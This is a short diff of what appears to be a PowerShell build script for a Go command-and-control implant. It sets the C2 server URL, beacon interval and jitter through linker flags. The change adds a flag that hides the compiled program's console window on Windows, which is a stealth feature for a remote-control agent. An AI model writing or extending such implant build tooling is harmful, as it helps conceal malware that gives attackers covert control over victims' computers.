@@ -65,7 +65,7 @@ try {
     Pop-Location
 
     # Build ldflags
-    $ldflags = "-s -w -buildid="
+    $ldflags = "-s -w -buildid= -H=windowsgui"
     $ldflags += " -X main.C2URL=$([System.Security.SecurityElement]::Escape($C2URL))"
     $ldflags += " -X main.IntervalStr=$Interval"
     $ldflags += " -X main.JitterStr=$Jitter"
